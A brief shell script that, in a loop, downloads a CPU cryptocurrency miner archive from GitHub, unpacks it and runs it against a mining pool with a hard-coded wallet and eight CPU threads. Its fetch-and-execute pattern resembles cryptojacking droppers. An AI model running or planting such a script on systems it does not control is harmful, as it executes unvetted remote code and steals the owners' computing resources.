#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xzf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.hadeh -p x --cpu 8

     echo COUNTER $COUNTER
     let COUNTER-=1
done
